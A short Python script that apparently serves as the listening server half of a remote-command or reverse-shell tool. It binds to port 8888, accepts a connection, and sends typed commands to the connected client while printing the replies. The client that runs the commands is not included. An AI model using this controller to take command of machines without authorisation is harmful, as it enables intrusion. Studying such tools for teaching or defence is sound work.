#!/usr/bin/env python
# coding:utf-8

# create socket (allows two computers to connect)
import socket

import sys


def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 8888
        s = socket.socket()
    except socket.error as msg:
        print("Create socket error: " + str(msg))


# Bind socket to port and wait for connection from clent
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding error: "+ str(msg) + '\n' + "Retrying...")
        socket_bind()

# Establish a connection with client(socket must be listening for them)
def socket_accpet():
    conn,address = s.accept()
    print("Connection has been established |" + "IP " + address[0] + "| Port " + str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while 1:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(4096),"utf-8")
            print(client_response,end="")

def main():
    socket_create()
    socket_bind()
    socket_accpet()

if __name__ == '__main__':
    main()




















